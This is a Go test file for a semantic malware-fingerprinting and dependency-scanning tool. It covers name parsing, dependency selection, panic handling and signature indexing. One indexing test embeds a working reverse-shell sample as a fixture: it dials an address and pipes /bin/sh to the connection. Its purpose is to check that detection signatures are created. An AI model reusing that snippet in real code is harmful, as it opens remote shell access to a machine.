// -- internal/cli/cli_test.go --
package cli

import (
	"encoding/json"
	"fmt"
	"io/fs"
	"os"
	"path/filepath"
	"slices"
	"sort"
	"strings"
	"testing"
	"time"

	"github.com/BlackVectorOps/semantic_firewall/v4/pkg/analysis/topology"
	"github.com/BlackVectorOps/semantic_firewall/v4/pkg/detection"
	"github.com/BlackVectorOps/semantic_firewall/v4/pkg/models"
	"golang.org/x/tools/go/packages"
)

// -- MOCKS --

type MockFileSystem struct {
	Files map[string][]byte
}

func (m *MockFileSystem) Stat(name string) (os.FileInfo, error) {
	if _, ok := m.Files[name]; ok {
		return &mockFileInfo{name: name, size: int64(len(m.Files[name]))}, nil
	}
	return nil, os.ErrNotExist
}
func (m *MockFileSystem) Open(name string) (fs.File, error) { return nil, os.ErrNotExist }
func (m *MockFileSystem) Getwd() (string, error)            { return "/mock/wd", nil }
func (m *MockFileSystem) Abs(path string) (string, error)   { return path, nil }
func (m *MockFileSystem) WalkDir(root string, fn fs.WalkDirFunc) error {
	for name := range m.Files {
		if strings.HasPrefix(name, root) {
			fn(name, &mockDirEntry{name: name}, nil)
		}
	}
	return nil
}
func (m *MockFileSystem) ReadFile(name string) ([]byte, error) {
	if data, ok := m.Files[name]; ok {
		return data, nil
	}
	return nil, os.ErrNotExist
}

type mockFileInfo struct {
	name string
	size int64
}

func (m *mockFileInfo) Name() string       { return m.name }
func (m *mockFileInfo) Size() int64        { return m.size }
func (m *mockFileInfo) Mode() os.FileMode  { return 0644 }
func (m *mockFileInfo) ModTime() time.Time { return time.Now() }
func (m *mockFileInfo) IsDir() bool        { return false }
func (m *mockFileInfo) Sys() any           { return nil }

type mockDirEntry struct{ name string }

func (m *mockDirEntry) Name() string               { return m.name }
func (m *mockDirEntry) IsDir() bool                { return false }
func (m *mockDirEntry) Type() os.FileMode          { return 0644 }
func (m *mockDirEntry) Info() (fs.FileInfo, error) { return &mockFileInfo{name: m.name}, nil }

type MockScanner struct {
	Hits []detection.ScanResult
}

func (m *MockScanner) ScanTopology(topo *topology.FunctionTopology, funcName string) ([]detection.ScanResult, error) {
	return m.Hits, nil
}
func (m *MockScanner) ScanTopologyExact(topo *topology.FunctionTopology, funcName string) (*detection.ScanResult, error) {
	if len(m.Hits) > 0 {
		return &m.Hits[0], nil
	}
	return nil, nil
}
func (m *MockScanner) Close() error { return nil }

// -- TESTS --

// TestShortFunctionName verifies that the parser correctly simplifies complex Go SSA names,
// specifically testing Generics support and proper receiver stripping.
func TestShortFunctionName(t *testing.T) {
	tests := []struct {
		input    string
		expected string
	}{
		// Standard
		{"fmt.Println", "Println"},
		{"main.main", "main"},
		{"github.com/user/repo/pkg.Func", "Func"},

		// Methods
		{"pkg.(*Type).Method", "(*Type).Method"},
		{"pkg.Type.Method", "Type.Method"},   // First dot separation (keeps receiver)
		{"(*Type).Method", "(*Type).Method"}, // Idempotency check

		// Recursive Parsing Fixes
		{"(*pkg.Type).Method", "(*Type).Method"},
		{"(pkg.Type).Method", "(Type).Method"},

		// Generics
		{"pkg.Func[int]", "Func[int]"},
		{"pkg.Func[a/b.T]", "Func[a/b.T]"}, // Slash inside generic should not split
		{"github.com/pkg.Func[github.com/other.Type]", "Func[github.com/other.Type]"},

		// Complex Combinations with Heuristic
		{"pkg.Type[sub.T].Method", "Type[sub.T].Method"}, // pkg is stripped. Type[T] is preserved.
		{"Type[sub.T].Method", "Type[sub.T].Method"},     // Prefix Type[sub.T] has brackets -> don't strip
	}

	for _, tc := range tests {
		got := ShortFunctionName(tc.input)
		if got != tc.expected {
			t.Errorf("ShortFunctionName(%q) = %q; want %q", tc.input, got, tc.expected)
		}
	}
}

// FuzzShortFunctionName uses fuzzing to ensure the parser never panics on arbitrary input.
func FuzzShortFunctionName(f *testing.F) {
	seeds := []string{
		"fmt.Println",
		"pkg.(*Type).Method",
		"github.com/pkg.Func[int]",
		"very.long.package.name/with.dots.Func",
		"broken[brackets",
		"((()))",
	}
	for _, s := range seeds {
		f.Add(s)
	}
	f.Fuzz(func(t *testing.T, input string) {
		// Just ensure it doesn't panic
		_ = ShortFunctionName(input)
	})
}

// TestDependencyFilter verifies that standard library packages are skipped
// while 3rd party packages are retained.
func TestDependencyFilter(t *testing.T) {
	tests := []struct {
		path   string
		expect bool // true = keep (scan), false = skip
	}{
		{"fmt", false},
		{"net/http", false},           // The bug was here (has slash)
		{"github.com/user/lib", true}, // Has dot in first segment
		{"gopkg.in/yaml.v2", true},    // Has dot
		{"myinternal/pkg", false},     // No dot, assumed internal/std
		{"cloud.google.com/go", true}, // Has dot
	}

	for _, tc := range tests {
		pkg := &packages.Package{
			PkgPath: "main",
			Imports: map[string]*packages.Package{
				tc.path: {PkgPath: tc.path},
			},
		}

		kept := false
		for _, d := range selectDependencies([]*packages.Package{pkg}, false) {
			if d.PkgPath == tc.path {
				kept = true
			}
		}
		if kept != tc.expect {
			t.Errorf("Filter logic for %q = %v; want %v", tc.path, kept, tc.expect)
		}
	}
}

func depPaths(pkgs []*packages.Package) []string {
	var out []string
	for _, p := range pkgs {
		out = append(out, p.PkgPath)
	}
	return out
}

// TestSelectDependencies_TraversesOwnModule verifies that third-party imports
// reached through the project's own packages count as dependencies, and that
// only transitive mode follows a dependency's own imports.
func TestSelectDependencies_TraversesOwnModule(t *testing.T) {
	own := &packages.Module{Path: "example.com/app"}
	depMod := &packages.Module{Path: "example.com/lib"}
	nestedMod := &packages.Module{Path: "example.com/nested"}

	nested := &packages.Package{PkgPath: "example.com/nested", Module: nestedMod}
	lib := &packages.Package{PkgPath: "example.com/lib", Module: depMod,
		Imports: map[string]*packages.Package{"example.com/nested": nested}}
	internalPkg := &packages.Package{PkgPath: "example.com/app/internal/store", Module: own,
		Imports: map[string]*packages.Package{"example.com/lib": lib}}
	root := &packages.Package{PkgPath: "example.com/app/cmd/app", Module: own,
		Imports: map[string]*packages.Package{
			"fmt":                            {PkgPath: "fmt"},
			"example.com/app/internal/store": internalPkg,
		}}

	if got := depPaths(selectDependencies([]*packages.Package{root}, false)); !slices.Equal(got, []string{"example.com/lib"}) {
		t.Errorf("direct = %v; want [example.com/lib]", got)
	}
	if got := depPaths(selectDependencies([]*packages.Package{root}, true)); !slices.Equal(got, []string{"example.com/lib", "example.com/nested"}) {
		t.Errorf("transitive = %v; want [example.com/lib example.com/nested]", got)
	}
}

// TestSelectDependencies_ModuleIdentityNotPrefix verifies that a dependency
// whose module path merely shares a prefix with the target's module is still
// treated as a dependency.
func TestSelectDependencies_ModuleIdentityNotPrefix(t *testing.T) {
	dep := &packages.Package{PkgPath: "github.com/foo/barbaz", Module: &packages.Module{Path: "github.com/foo/barbaz"}}
	root := &packages.Package{PkgPath: "github.com/foo/bar", Module: &packages.Module{Path: "github.com/foo/bar"},
		Imports: map[string]*packages.Package{"github.com/foo/barbaz": dep}}

	if got := depPaths(selectDependencies([]*packages.Package{root}, false)); !slices.Equal(got, []string{"github.com/foo/barbaz"}) {
		t.Errorf("deps = %v; want [github.com/foo/barbaz]", got)
	}
}

// countingScanner records how many functions were submitted for scanning.
type countingScanner struct{ scanned int }

func (c *countingScanner) ScanTopology(*topology.FunctionTopology, string) ([]detection.ScanResult, error) {
	c.scanned++
	return nil, nil
}

func (c *countingScanner) ScanTopologyExact(*topology.FunctionTopology, string) (*detection.ScanResult, error) {
	c.scanned++
	return nil, nil
}

func (c *countingScanner) Close() error { return nil }

// TestRunScanDeps_ScansDependencyFunctions loads this repository's pkg/api,
// whose only third-party imports arrive through other packages of this module
// (pkg/diff imports golang.org/x/tools). Direct mode used to load those
// imports as type-less placeholders and scan zero functions in them.
func TestRunScanDeps_ScansDependencyFunctions(t *testing.T) {
	if testing.Short() {
		t.Skip("loads and builds SSA for real dependencies")
	}

	run := func(depth string) ([]string, int, int) {
		scanner := &countingScanner{}
		_, funcs, deps, err := RunScanDeps(RealPackageLoader{}, "../../pkg/api",
			models.ScanOptions{ScanDeps: true, DepsDepth: depth}, scanner)
		if err != nil {
			t.Fatalf("RunScanDeps(%s): %v", depth, err)
		}
		return deps, funcs, scanner.scanned
	}

	directDeps, directFuncs, directScanned := run("direct")
	if !slices.Contains(directDeps, "golang.org/x/tools/go/ssa") {
		t.Errorf("direct deps = %v; want golang.org/x/tools/go/ssa (imported via pkg/diff)", directDeps)
	}
	for _, d := range directDeps {
		if strings.HasPrefix(d, "github.com/BlackVectorOps/semantic_firewall/") {
			t.Errorf("own-module package %s reported as a dependency", d)
		}
	}
	if directFuncs == 0 || directScanned != directFuncs {
		t.Errorf("direct: functions = %d, scanned = %d; want equal and > 0", directFuncs, directScanned)
	}

	transitiveDeps, transitiveFuncs, _ := run("transitive")
	if len(transitiveDeps) <= len(directDeps) || transitiveFuncs <= directFuncs {
		t.Errorf("transitive (%d deps, %d funcs) should exceed direct (%d deps, %d funcs)",
			len(transitiveDeps), transitiveFuncs, len(directDeps), directFuncs)
	}
}

// TestScanDeterminism ensures that map iteration order does not affect result order.
func TestScanDeterminism(t *testing.T) {
	// 1. Create a large map to force random iteration order
	depPkgs := make(map[string]int)
	for i := 0; i < 100; i++ {
		key := fmt.Sprintf("pkg/dep/%d", i)
		depPkgs[key] = i
	}

	// 2. Helper to simulate the fix: Extract Sorted
	extractSorted := func() []string {
		var keys []string
		for k := range depPkgs {
			keys = append(keys, k)
		}
		sort.Strings(keys)
		return keys
	}

	run1 := extractSorted()
	run2 := extractSorted()

	if len(run1) != len(run2) {
		t.Fatalf("Length mismatch: %d vs %d", len(run1), len(run2))
	}

	for i := range run1 {
		if run1[i] != run2[i] {
			t.Errorf("Mismatch at index %d: %s vs %s. Sorting failed to ensure determinism.", i, run1[i], run2[i])
		}
	}
}

// TestJSONOutputIntegrity verifies that check output is a valid JSON array.
func TestJSONOutputIntegrity(t *testing.T) {
	output := []struct {
		Target string `json:"target"`
	}{{Target: "test1"}, {Target: "test2"}}

	data, err := json.Marshal(output)
	if err != nil {
		t.Fatal(err)
	}
	expected := `[{"target":"test1"},{"target":"test2"}]`
	if string(data) != expected {
		t.Errorf("JSON marshaling failed, got %s", string(data))
	}
}

// TestRunCheckLogic_Isolation verifies logic without touching the disk.
func TestRunCheckLogic_Isolation(t *testing.T) {
	mockFS := &MockFileSystem{
		Files: map[string][]byte{
			"/app/main.go": []byte("package main\nfunc main() {}"),
		},
	}

	// Create a dummy file in the list for the logic to find since we mock WalkDir
	// Note: In the real implementation CollectFiles uses WalkDir.
	// Our mock WalkDir iterates the map.

	err := RunCheckLogic(mockFS, "/app/main.go", false, false, "")
	if err != nil {
		t.Fatalf("RunCheckLogic failed with mock FS: %v", err)
	}
}

// panickingFileSystem wraps MockFileSystem but panics on Stat for a specific
// path. Used to exercise the panic-recovery path in ProcessFilesParallel
// without needing to corrupt SSA generation.
type panickingFileSystem struct {
	*MockFileSystem
	panicOn string
}

func (p *panickingFileSystem) Stat(name string) (os.FileInfo, error) {
	if name == p.panicOn {
		panic("synthetic panic for test")
	}
	return p.MockFileSystem.Stat(name)
}

// TestProcessFilesParallel_PanicSurfacedAsError ensures a panic during
// per-file analysis is recorded as an ErrorMessage on the FileOutput and
// flips the hasErrors flag, so --strict fails closed instead of silently
// passing a crashed run.
func TestProcessFilesParallel_PanicSurfacedAsError(t *testing.T) {
	mockFS := &panickingFileSystem{
		MockFileSystem: &MockFileSystem{
			Files: map[string][]byte{
				"/app/boom.go": []byte("package main"),
			},
		},
		panicOn: "/app/boom.go",
	}

	results, hasErrors, err := ProcessFilesParallel(mockFS, []string{"/app/boom.go"}, true, nil)
	if err != nil {
		t.Fatalf("ProcessFilesParallel returned err: %v", err)
	}
	if !hasErrors {
		t.Fatal("expected hasErrors=true after a recovered panic; got false")
	}
	if len(results) != 1 {
		t.Fatalf("expected 1 result, got %d", len(results))
	}
	if results[0].ErrorMessage == "" {
		t.Error("expected ErrorMessage to be populated for the panicking file")
	}
	if !strings.Contains(results[0].ErrorMessage, "panic") {
		t.Errorf("ErrorMessage should mention panic, got: %q", results[0].ErrorMessage)
	}
	if results[0].File != "/app/boom.go" {
		t.Errorf("File field lost; got %q", results[0].File)
	}
}

// TestFileSizeGuard verifies strict size limits are enforced.
func TestFileSizeGuard(t *testing.T) {
	mockFS := &MockFileSystem{
		Files: map[string][]byte{
			"/app/huge.go": make([]byte, MaxSourceFileSize+100),
		},
	}

	output := ProcessFile(mockFS, "/app/huge.go", false, nil)
	if output.ErrorMessage == "" {
		t.Error("Expected error for oversized file, got none")
	}
	expected := fmt.Sprintf("file exceeds maximum analysis size of %d bytes", MaxSourceFileSize)
	if output.ErrorMessage != expected {
		t.Errorf("Expected error %q, got %q", expected, output.ErrorMessage)
	}
}

// TestRunIndex_SkipsImportOnlyInit verifies that a package initializer which
// only runs its imports' initializers is not indexed (its signature would
// match any package with the same imports), while one that does real work is.
func TestRunIndex_SkipsImportOnlyInit(t *testing.T) {
	dir := t.TempDir()
	index := func(src string) []string {
		path := filepath.Join(dir, "sample.go")
		if err := os.WriteFile(path, []byte(src), 0o644); err != nil {
			t.Fatal(err)
		}
		results, err := LoadAndFingerprint(RealFileSystem{}, path)
		if err != nil {
			t.Fatalf("LoadAndFingerprint: %v", err)
		}
		sigs, _, err := RunIndexJSON(path, results, "S", "HIGH", "malware", filepath.Join(t.TempDir(), "db.json"))
		if err != nil {
			t.Fatalf("RunIndexJSON: %v", err)
		}
		var names []string
		for _, s := range sigs {
			names = append(names, s.Name)
		}
		return names
	}

	names := index(`package sample

import (
	"net"
	"os/exec"
)

func Payload(addr string) {
	c, _ := net.Dial("tcp", addr)
	cmd := exec.Command("/bin/sh")
	cmd.Stdin = c
	cmd.Run()
}
`)
	if slices.Contains(names, "S_init") {
		t.Errorf("import-only init was indexed: %v", names)
	}
	if !slices.Contains(names, "S_Payload") {
		t.Errorf("payload function not indexed: %v", names)
	}

	names = index(`package sample

import "os"

var home = os.Getenv("HOME")

func Use() string { return home }
`)
	if !slices.Contains(names, "S_init") {
		t.Errorf("init with a package-level initializer was skipped: %v", names)
	}
}
